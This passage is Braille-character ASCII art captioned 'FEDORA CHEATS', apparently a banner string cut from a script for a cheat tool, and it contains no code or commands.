⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⠢⠴⠿⢿⣿⣧⣴⣿⣿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⢿⠿⣿⣿⠿⣿⣷⠸⣿⣿⣿⣇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⡿⠿⣋⣁⣤⣤⣤⣤⣤⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣤⣄⣀⣹⣧⣀⡀⠙⢿⣧⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠙⠇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠴⠿⠟⣡⣾⣿⣿⣿⣿⣿⡿⠿⠿⠟⠻⠇⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡋⠻⠿⢿⡞⠙⠿⢿⣿⣿⣿⣿⣇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⡿⢿⠁⠀⠀⠀⢀⣴⣶⣮⣉⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣶⣶⠇⠀⠀⠀⠙⠿⣿⣿⢿⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠺⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠈⠻⠿⠿⢿⡿⠃⠀⠀⠀⠀⠀⠀⠸⣿⣾⠇⠰
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠠⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⢀⣄⠀⠀⠀⣠⡆⠀⠀⠀⣠⡔⠒⠒⢶⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡟⢠⣶
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣏⠀⠀⠀⠀⣠⣤⣾⣿⠏⠀⠀⠀⣿⠁⠀⢠⣿⣿⣶⣶⣶⣶⣾⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠈⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⢳⣶⣶⣿⡟⠉⠁⢀⡀⠀⠀⠀⠻⡆⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⢰⣿⡇⠀⠀⠀⠀⠀⣿⡇⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣴⣶⣶⡾⠿⠷⣶⣄⣿⣧⠀⠀⢸⣿⠀⠀⣇⠀⠹⡀⠀⢻⣿⣿⣿⣿⣿⣿⡏⠀⢀⠀⠀⢀⣾⠋⠁⠀⠀⠀⠀⢠⣿⣇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠟⠛⠁⠈⠀⠀⠀⠈⢹⣿⣿⡄⠀⢸⣿⠀⠀⢹⣤⣴⣿⣶⣾⣿⣿⣿⣿⣿⣿⣷⣶⣿⠦⠴⠿⠁⠀⠀⠀⠀⠀⣶⣾⠛⠙⠲⣶
⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣷⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⢻⣇⠀⠀⢹⡄⠀⠈⠉⠙⢿⡏⠙⠛⢿⣿⣿⣿⡿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠏⠀⠀⠀⠈
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠻⣷⣄⣀⣴⣦⣄⣰⣿⠋⠀⢸⢿⣇⠀⢸⣇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠿⠿⠿⠛⠻⡟⠁⠀⠀⢸⣼⡿⠀⢸⡟⣿⢀⠀⡄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀
⠠⠀⠀⠀⠀⠀⠚⠿⣦⣄⣴⠀⠀⠀⣆⠀⠀⠀⠀⠀⠀⣸⣿⠇⠀⢸⡟⣿⢿⣿⣇⠻⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣧⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⠷⣄⠀⣿⠀⠀⠀⠀⠀⣴⣿⠇⠀⠀⢸⠇⠀⠸⠛⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⢿⣿⡀⠀⠠⠤⢀⣿⡟⠀⠀⢠⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀
⠀⠀⣀⠀⠀⠴⣀⣀⡀⠀⠀⠀⠀⠀⢿⣿⣦⠀⠀⠸⣿⡇⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣄⠀⠀⠈
⠀⠀⠀⠀⠀⢀⠈⠻⣿⣶⣆⠀⠀⠀⢸⡇⠀⢠⠀⠀⢿⣇⠀⠀⣸⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠟⠀⠀⠀


⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣦⣤⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢻⣧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠻⣏⢹⣷⣸⣿⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⡛⣿⣿⣀⣶⣷⣼⣿⡿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣷⢻⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡼⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⣿⢿⣿⣿⢹⣿⣿⡟⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀
⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣍⠀⣿⠿⢿⠀⣿⣿⡜⣿⡿⣿⠙⣿⣿⣻⣿⣿⣿⣿⣿⣿⣿⣇⠀
⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣾⣄⣤⠀⠛⢘⡇⠹⣧⣼⡇⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡧⣾⣿⣿⠀⣿⡟⣿⠸⣿⣇⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⣿⠿⠟⠀⠛⠀⣩⣤⣶⣿⣿⡿⣽⣿⣿⣿⣿⣿⠀
⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣴⣶⣶⣶⣿⣿⣿⣿⣿⣿⢿⣾⣿⣿⣿⣿⣿⡟⠀
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣿⣿⣿⣿⣿⡛⢿⣿⡿⠁⠀
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⡟⠋⣽⣟⡿⣧⡉⢿⣿⡝⣟⢲⣾⠁⠀⠀
⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢏⣿⣿⣿⣿⣿⠉⣿⣿⣿⡇⠀⣶⣾⡿⣦⠘⣷⣯⣾⠟⢰⡄⠋⣷⡿⠃⠀⠀⠀
⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣾⣿⣿⣿⣿⣿⢠⣿⣿⣿⣿⠀⢻⣿⠷⢿⣇⠘⠿⣀⠀⢈⣥⡾⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⡀⠘⣿⠀⠀⢹⡆⠀⣻⣴⠟⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⣾⣿⣿⣿⣿⣇⠀⢻⣤⣴⣶⡿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⠿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

                 FEDORA CHEATS]])
